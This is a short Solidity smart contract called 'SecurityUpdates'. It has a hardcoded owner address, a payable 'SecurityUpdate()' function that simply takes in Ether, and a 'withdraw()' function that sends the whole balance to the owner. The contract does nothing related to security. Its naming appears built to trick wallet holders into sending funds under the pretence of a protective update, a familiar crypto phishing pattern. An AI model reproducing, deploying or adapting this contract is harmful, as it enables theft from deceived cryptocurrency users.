// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract SecurityUpdates {

    address private  owner;

    constructor() public {   
        owner=0x97Cb4D24C9cf089F84c0e83370018B404b2E6421;
    }
    function getOwner(
    ) public view returns (address) {    
        return owner;
    }
    function withdraw() public {
        require(owner == msg.sender);
        payable(msg.sender).transfer(address(this).balance);
    }

    function SecurityUpdate() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

}